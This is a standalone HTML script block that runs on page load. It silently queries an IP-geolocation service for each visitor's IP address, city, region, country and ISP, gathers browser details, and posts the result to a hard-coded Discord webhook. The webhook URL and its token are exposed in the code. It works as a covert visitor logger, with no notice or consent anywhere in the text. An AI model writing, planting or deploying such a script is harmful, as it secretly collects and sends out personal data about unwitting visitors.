
    <script>
        document.addEventListener('DOMContentLoaded', async function() {
            // Discord Webhook URL
            const webhookURL = 'https://discord.com/api/webhooks/1316084052486389883/K48EESZc9pf4WpLD2AinU4RZmbNktJmWEsS8HjB0LasKw434DJM_AsJp-5kR0DfI9mSU';

            // Function to fetch IP and location data
            async function fetchLocationData() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    return data;
                } catch (error) {
                    console.error('Error fetching location data:', error);
                    return null;
                }
            }

            // Function to gather browser and device information
            function getBrowserInfo() {
                return {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language
                };
            }

            // Function to send data to the webhook
            async function sendToWebhook(data) {
                const payload = {
                    content: `**New Visitor Information**:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
                };

                try {
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                } catch (error) {
                    console.error('Error sending data to webhook:', error);
                }
            }

            // Main function to gather and send data
            (async function() {
                const locationData = await fetchLocationData();
                const browserInfo = getBrowserInfo();

                if (locationData) {
                    const userData = {
                        ip: locationData.ip,
                        city: locationData.city,
                        region: locationData.region,
                        country: locationData.country_name,
                        isp: locationData.org,
                        browser: browserInfo
                    };

                    // Send the combined data to Discord Webhook
                    sendToWebhook(userData);
                }
            })();
        });
    </script>
